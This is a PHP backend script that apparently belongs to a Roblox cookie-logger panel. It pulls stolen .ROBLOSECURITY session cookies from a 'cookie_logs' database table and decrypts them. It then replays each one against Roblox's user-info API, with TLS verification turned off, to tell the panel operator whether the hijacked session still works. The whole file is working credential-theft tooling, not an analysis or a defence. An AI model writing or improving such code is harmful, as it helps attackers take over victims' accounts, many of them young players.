<?php
    @session_start();
    include_once 'includes/functions.php';
    include_once 'includes/checks.php';
     
    header('Content-type: application/json; charset=UTF-8');
    
    $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
    $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();

     if (isset($_POST['id']) && !empty($_POST['id'])){

        if($banned == 0){

            $get = pdoQuery($db, "SELECT * FROM `cookie_logs` WHERE `cookieID`=?", [htmlspecialchars($_POST['id'])]);
            $results = $get->fetchAll(PDO::FETCH_ASSOC);

            foreach($results as $result){
                $cookie = decrypt(htmlspecialchars($result['cookie']));

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Cookie: .ROBLOSECURITY=' . $cookie
                ));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $output = curl_exec($ch);
                curl_close($ch);
            
                if(strpos($output, "ThumbnailUrl") == true) {
                    echo "<div class='d-flex justify-content-start bd-highlight mb-2 text-muted text-left'>
                    <div class='p-2 bd-highlight'>Cookie available!</div>
                    </div>";
                }elseif(strpos($output, "ThumbnailUrl") !== true){
                    echo "<div class='d-flex justify-content-start bd-highlight mb-2 text-muted text-left'>
                    <div class='p-2 bd-highlight'>Cookie is expired!</div>
                    </div>";
                }
            }
        }else{
            echo "<div class='d-flex justify-content-start bd-highlight mb-2 text-muted text-left text-lightred'>
            <div class='p-2 bd-highlight'>You are banned. :'D</div>
            </div>";
        }
     }
?>